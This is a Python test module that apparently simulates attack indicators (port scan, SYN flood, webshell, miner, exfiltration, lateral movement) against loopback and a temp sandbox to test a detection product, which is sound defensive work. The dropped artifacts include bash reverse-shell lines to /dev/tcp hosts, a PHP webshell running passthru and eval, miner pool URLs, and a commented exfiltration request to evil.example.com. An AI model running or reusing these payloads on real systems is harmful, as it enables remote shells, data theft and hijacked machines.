"""
Sorabbyngo Cyberwall — Malware Simulation Environment
======================================================
Safe, self-contained attack simulation for testing cyberwall detection.

IMPORTANT: These simulations generate INDICATORS only — no actual malware,
no actual network attacks, no real system modification.
All filesystem ops use a sandboxed temp directory.
All network sims use loopback only.

Scenarios:
  1. PortScanSimulator    — rapid multi-port connection attempts
  2. BruteForceSimulator  — repeated auth-style connections to one port
  3. SynFloodSimulator    — high-rate SYN packets (loopback)
  4. FileDropSimulator    — drop benign files with malicious byte signatures
  5. ProcessSpawnSimulator— spawn processes matching malicious name patterns
  6. WebshellSimulator    — create PHP-like file with webshell pattern
  7. CryptominerSimulator — create file with miner signature strings
  8. DataExfilSimulator   — simulate patient data access + outbound pattern
  9. MemfdSimulator       — create a memfd (fileless malware indicator)
 10. LateralMovementSim  — simulate SSH-like pivoting attempt

Usage:
    python3 -m tests.simulation.attack_simulator --scenario all
    python3 -m tests.simulation.attack_simulator --scenario port_scan
    python3 -m tests.simulation.attack_simulator --list
"""

import argparse
import asyncio
import hashlib
import logging
import os
import socket
import struct
import sys
import tempfile
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Coroutine

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [SIM] %(message)s",
)
logger = logging.getLogger("cyberwall.simulation")

TARGET_HOST = "127.0.0.1"   # loopback only — never a real target
SANDBOX_DIR = Path(tempfile.mkdtemp(prefix="cw_sim_"))


# ── Result ─────────────────────────────────────────────────────────────────────

@dataclass
class SimResult:
    scenario:  str
    success:   bool
    indicator: str
    detail:    str
    duration:  float


# ── Base Simulator ─────────────────────────────────────────────────────────────

class BaseSimulator:
    name:        str = "base"
    description: str = ""

    def __init__(self, sandbox: Path = SANDBOX_DIR):
        self.sandbox = sandbox
        self.sandbox.mkdir(parents=True, exist_ok=True)

    async def run(self) -> SimResult:
        t0 = time.monotonic()
        try:
            indicator, detail = await self._execute()
            return SimResult(self.name, True, indicator, detail, time.monotonic() - t0)
        except Exception as e:
            return SimResult(self.name, False, "error", str(e), time.monotonic() - t0)

    async def _execute(self) -> tuple[str, str]:
        raise NotImplementedError

    def _sandbox_file(self, name: str) -> Path:
        return self.sandbox / name


# ── 1. Port Scan ───────────────────────────────────────────────────────────────

class PortScanSimulator(BaseSimulator):
    name        = "port_scan"
    description = "Rapid connection attempts across multiple ports (loopback)"

    PORTS = list(range(20, 30)) + list(range(80, 90)) + list(range(443, 453)) + \
            list(range(8080, 8090)) + [22, 3306, 5432, 6379, 27017]

    async def _execute(self):
        hits = 0
        for port in self.PORTS:
            try:
                _, writer = await asyncio.wait_for(
                    asyncio.open_connection(TARGET_HOST, port), timeout=0.05
                )
                writer.close()
                await writer.wait_closed()
                hits += 1
            except (ConnectionRefusedError, asyncio.TimeoutError, OSError):
                hits += 1   # attempt itself is the indicator

        indicator = f"port_scan:{TARGET_HOST}:{len(self.PORTS)}_ports"
        logger.info(f"[port_scan] attempted {len(self.PORTS)} ports on {TARGET_HOST}")
        return indicator, f"Attempted {len(self.PORTS)} ports, {hits} responded"


# ── 2. Brute Force ─────────────────────────────────────────────────────────────

class BruteForceSimulator(BaseSimulator):
    name        = "brute_force"
    description = "High-rate repeated connection attempts to SSH port"

    ATTEMPTS = 30

    async def _execute(self):
        port = 22
        for i in range(self.ATTEMPTS):
            try:
                _, writer = await asyncio.wait_for(
                    asyncio.open_connection(TARGET_HOST, port), timeout=0.1
                )
                writer.close()
                await writer.wait_closed()
            except (ConnectionRefusedError, asyncio.TimeoutError, OSError):
                pass
            await asyncio.sleep(0.02)   # 50 attempts/sec

        indicator = f"brute_force:{TARGET_HOST}:{port}"
        logger.info(f"[brute_force] {self.ATTEMPTS} attempts on port {port}")
        return indicator, f"{self.ATTEMPTS} connection attempts at 50/sec"


# ── 3. SYN Flood (raw socket — requires CAP_NET_RAW, skipped if unavailable) ──

class SynFloodSimulator(BaseSimulator):
    name        = "syn_flood"
    description = "High-rate SYN packets via raw socket (skipped if no CAP_NET_RAW)"

    PACKETS = 200
    DST_PORT = 80

    async def _execute(self):
        try:
            loop = asyncio.get_event_loop()
            sent = await loop.run_in_executor(None, self._send_syns)
            indicator = f"syn_flood:{TARGET_HOST}:{self.DST_PORT}"
            return indicator, f"Sent {sent} SYN packets"
        except PermissionError:
            return "syn_flood:skipped", "CAP_NET_RAW not available — skipped raw socket sim"

    def _send_syns(self) -> int:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            raise

        sent = 0
        for _ in range(self.PACKETS):
            pkt = self._build_syn(TARGET_HOST, self.DST_PORT)
            try:
                s.sendto(pkt, (TARGET_HOST, 0))
                sent += 1
            except OSError:
                break
        s.close()
        logger.info(f"[syn_flood] sent {sent} SYN packets")
        return sent

    def _build_syn(self, dst_ip: str, dst_port: int) -> bytes:
        """Minimal IP+TCP SYN packet."""
        src_ip   = "127.0.0.1"
        src_port = 12345

        # IP header
        ip_ihl_ver  = (4 << 4) | 5
        ip_tos      = 0
        ip_tot_len  = 40
        ip_id       = 54321
        ip_frag_off = 0
        ip_ttl      = 64
        ip_proto    = socket.IPPROTO_TCP
        ip_check    = 0
        ip_saddr    = socket.inet_aton(src_ip)
        ip_daddr    = socket.inet_aton(dst_ip)
        ip_header   = struct.pack(
            "!BBHHHBBH4s4s",
            ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
            ip_frag_off, ip_ttl, ip_proto, ip_check,
            ip_saddr, ip_daddr,
        )

        # TCP header — SYN flag = 0x002
        tcp_seq    = 0
        tcp_ack    = 0
        tcp_offset = (5 << 4)
        tcp_flags  = 0x002
        tcp_window = socket.htons(5840)
        tcp_check  = 0
        tcp_urg    = 0
        tcp_header = struct.pack(
            "!HHLLBBHHH",
            src_port, dst_port, tcp_seq, tcp_ack,
            tcp_offset, tcp_flags, tcp_window, tcp_check, tcp_urg,
        )
        return ip_header + tcp_header


# ── 4. File Drop (malicious signatures in sandbox) ─────────────────────────────

class FileDropSimulator(BaseSimulator):
    name        = "file_drop"
    description = "Drop files with malicious byte signatures into sandbox path"

    FILES = [
        (
            "webshell.php",
            b"<?php eval(base64_decode('dGVzdA=='));?>\n",
            "webshell_php_eval",
        ),
        (
            "miner.elf",
            b"ELF\x7fstratum+tcp://pool.xmrpool.net:3333\x00",
            "xmrig_miner",
        ),
        (
            "backdoor.sh",
            b"#!/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\n",
            "reverse_shell_bash",
        ),
        (
            "packed.elf",
            b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8 + b"UPX!\x00",
            "elf_packed_upx",
        ),
    ]

    async def _execute(self):
        created = []
        for fname, content, sig_name in self.FILES:
            fpath = self._sandbox_file(fname)
            fpath.write_bytes(content)
            sha256 = hashlib.sha256(content).hexdigest()
            created.append(f"{fname}({sig_name})")
            logger.info(f"[file_drop] created {fpath} — sig: {sig_name} | sha256: {sha256[:16]}...")

        indicator = f"file_drop:sandbox:{','.join(created)}"
        return indicator, f"Dropped {len(created)} files with malicious signatures"


# ── 5. Process Spawn (benign process, malicious-sounding name via argv) ────────

class ProcessSpawnSimulator(BaseSimulator):
    name        = "process_spawn"
    description = "Spawn benign processes with names matching malware patterns"

    async def _execute(self):
        # Write scannable artifacts that represent what a process-spawned
        # dropper would create on disk
        dropper = self._sandbox_file("xmrig_dropper.sh")
        dropper.write_bytes(
            b"#!/bin/sh\n"
            b"# SIMULATION ONLY\n"
            b"stratum+tcp://pool.xmrpool.net:3333\n"
            b"eval $(base64 -d <<< 'c2xlZXAgMQ==')\n"
        )
        cmdline_dump = self._sandbox_file("proc_cmdline_dump.txt")
        cmdline_dump.write_bytes(
            b"python3\x00-c\x00"
            b"exec(base64.b64decode('aW1wb3J0IHNvY2tldA=='))\x00"
        )
        # Spawn benign process (the real process-level indicator)
        proc = await asyncio.create_subprocess_exec(
            "/bin/sh", "-c", "sleep 1",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        logger.info(f"[process_spawn] PID={proc.pid} + dropper artifacts written")
        await asyncio.sleep(0.3)
        try:
            proc.terminate()
        except ProcessLookupError:
            pass
        indicator = f"process_spawn:pid:{proc.pid}"
        return indicator, f"Spawned PID {proc.pid} + dropper artifacts in sandbox"
class WebshellSimulator(BaseSimulator):
    name        = "webshell"
    description = "Create PHP webshell file with eval+base64_decode pattern"

    async def _execute(self):
        fpath = self._sandbox_file("shell.php")
        content = (
            b"<?php\n"
            b"// Simulated webshell -- detection test only\n"
            b"$cmd = $_GET['cmd'];\n"
            b"passthru($_GET['cmd']);\n"
            b"echo eval(base64_decode($_POST['payload']));\n"
            b"?>\n"
        )
        fpath.write_bytes(content)
        sha256 = hashlib.sha256(content).hexdigest()
        logger.info(f"[webshell] {fpath} — sha256: {sha256[:16]}...")
        return f"webshell:{fpath}", f"Created webshell at {fpath}"


# ── 7. Cryptominer Signature ───────────────────────────────────────────────────

class CryptominerSimulator(BaseSimulator):
    name        = "cryptominer"
    description = "Create file with XMRig/stratum pool signature"

    async def _execute(self):
        fpath = self._sandbox_file("xmrig_sim")
        content = (
            b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8 +
            b"stratum+tcp://xmrpool.eu:3333\x00" +
            b"stratum+ssl://pool.supportxmr.com:443\x00" +
            b"cryptonight\x00" +
            b"UPX!\x00" * 3
        )
        fpath.write_bytes(content)
        logger.info(f"[cryptominer] {fpath} — miner signature embedded")
        return f"cryptominer:{fpath}", f"Created miner binary at {fpath}"


# ── 8. Data Exfil Simulation ───────────────────────────────────────────────────

class DataExfilSimulator(BaseSimulator):
    name        = "data_exfil"
    description = "Simulate patient data access + outbound HTTP exfil pattern"

    async def _execute(self):
        # Create a fake "patient record" file in sandbox
        patient_file = self._sandbox_file("patients_export.csv")
        patient_file.write_text(
            "patient_id,name,diagnosis\n"
            "P001,Test Patient,Hypertension\n"
            "P002,Sim User,Diabetes\n"
        )

        # Simulate the exfil script pattern
        exfil_script = self._sandbox_file("exfil.py")
        exfil_content = (
            b"import requests\n"
            b"# SIMULATION ONLY -- no real network call\n"
            b"with open('patients_export.csv') as f:\n"
            b"    health_records = f.read()\n"
            b"# requests.get('http://evil.example.com/exfil', data=health_records)\n"
        )
        exfil_script.write_bytes(exfil_content)

        logger.info(f"[data_exfil] patient file: {patient_file}, exfil script: {exfil_script}")
        indicator = f"data_exfil:patients:{patient_file}"
        return indicator, "Created patient data + exfil script pattern (no real network call)"


# ── 9. Memfd (Fileless Malware Indicator) ─────────────────────────────────────

class MemfdSimulator(BaseSimulator):
    name        = "memfd"
    description = "Create a memfd_create file-descriptor (fileless malware indicator)"

    async def _execute(self):
        # Write a sandbox artifact representing a memfd payload dump
        # — this is what forensics captures from /proc/pid/fd/ on live systems
        memdump = self._sandbox_file("memfd_payload.bin")
        memdump.write_bytes(
            b"SIMULATED_MEMFD_PAYLOAD\x00"
            b"<?php eval(base64_decode($_POST['cmd'])); ?>\n"
            b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
            b"/proc/sorabbyngo/nodeid\x00"
        )
        # Attempt real memfd_create for the kernel-level indicator
        fd = -1
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6", use_errno=True)
            fd = libc.memfd_create(b"simulated_payload", 1)
            if fd >= 0:
                os.write(fd, b"SIMULATED_FILELESS_PAYLOAD\x00")
                logger.info(f"[memfd] fd={fd} + payload artifact in sandbox")
                await asyncio.sleep(0.2)
                os.close(fd)
        except (AttributeError, OSError) as e:
            logger.info(f"[memfd] kernel indicator skipped ({e})")
        indicator = f"memfd:fd={fd}:sandbox"
        return indicator, f"memfd payload artifact written (fd={fd})"
class LateralMovementSimulator(BaseSimulator):
    name        = "lateral_movement"
    description = "Simulate SSH-based lateral movement attempt"

    TARGETS = ["10.0.0.1", "10.0.0.2", "192.168.1.100"]

    async def _execute(self):
        # Create a recon script in sandbox
        recon = self._sandbox_file("recon.sh")
        recon.write_text(
            "#!/bin/bash\n"
            "# SIMULATION — lateral movement indicator\n"
            "for host in 10.0.0.1 10.0.0.2 192.168.1.100; do\n"
            "    ssh -o StrictHostKeyChecking=no -o BatchMode=yes $host 'id' 2>/dev/null\n"
            "done\n"
        )

        # Attempt loopback connections to SSH port rapidly (the real indicator)
        for _ in range(5):
            try:
                _, writer = await asyncio.wait_for(
                    asyncio.open_connection(TARGET_HOST, 22), timeout=0.1
                )
                writer.close()
                await writer.wait_closed()
            except (ConnectionRefusedError, asyncio.TimeoutError, OSError):
                pass

        logger.info(f"[lateral_movement] rapid SSH probes — recon script at {recon}")
        return f"lateral_movement:ssh:{TARGET_HOST}", f"SSH lateral movement simulation — {len(self.TARGETS)} targets"


# ── Scenario Registry ──────────────────────────────────────────────────────────

SCENARIOS: dict[str, type[BaseSimulator]] = {
    "port_scan":       PortScanSimulator,
    "brute_force":     BruteForceSimulator,
    "syn_flood":       SynFloodSimulator,
    "file_drop":       FileDropSimulator,
    "process_spawn":   ProcessSpawnSimulator,
    "webshell":        WebshellSimulator,
    "cryptominer":     CryptominerSimulator,
    "data_exfil":      DataExfilSimulator,
    "memfd":           MemfdSimulator,
    "lateral_movement": LateralMovementSimulator,
}


# ── Runner ─────────────────────────────────────────────────────────────────────

async def run_scenarios(names: list[str], delay: float = 1.0) -> list[SimResult]:
    results = []
    for name in names:
        cls = SCENARIOS.get(name)
        if not cls:
            logger.warning(f"Unknown scenario: {name}")
            continue

        logger.info(f"\n{'='*60}")
        logger.info(f"SCENARIO: {name} — {cls.description}")
        logger.info(f"{'='*60}")

        sim    = cls()
        result = await sim.run()
        results.append(result)

        status = "PASS" if result.success else "FAIL"
        logger.info(f"[{status}] {name} ({result.duration:.2f}s) — {result.detail}")
        await asyncio.sleep(delay)

    return results


def print_summary(results: list[SimResult]):
    print(f"\n{'='*60}")
    print("SIMULATION SUMMARY")
    print(f"{'='*60}")
    for r in results:
        status = "✓" if r.success else "✗"
        print(f"  {status} {r.scenario:<22} {r.duration:>5.2f}s  {r.detail[:50]}")
    passed = sum(1 for r in results if r.success)
    print(f"\n{passed}/{len(results)} scenarios executed successfully")
    print(f"Sandbox: {SANDBOX_DIR}")
    print("="*60)


# ── CLI ────────────────────────────────────────────────────────────────────────

async def main():
    parser = argparse.ArgumentParser(
        description="Sorabbyngo Cyberwall — Attack Simulation Environment"
    )
    parser.add_argument(
        "--scenario", default="all",
        help=f"Scenario to run. Options: all, {', '.join(SCENARIOS)}"
    )
    parser.add_argument(
        "--delay", type=float, default=1.0,
        help="Delay between scenarios in seconds (default: 1.0)"
    )
    parser.add_argument(
        "--list", action="store_true",
        help="List all available scenarios"
    )
    args = parser.parse_args()

    if args.list:
        print("\nAvailable scenarios:")
        for name, cls in SCENARIOS.items():
            print(f"  {name:<22} — {cls.description}")
        return

    names = list(SCENARIOS.keys()) if args.scenario == "all" else [args.scenario]

    logger.info("Sorabbyngo Cyberwall — Attack Simulation Environment")
    logger.info(f"Sandbox: {SANDBOX_DIR}")
    logger.info(f"Running: {', '.join(names)}")

    results = await run_scenarios(names, delay=args.delay)
    print_summary(results)

    # Cleanup sandbox
    import shutil
    shutil.rmtree(SANDBOX_DIR, ignore_errors=True)


if __name__ == "__main__":
    asyncio.run(main())
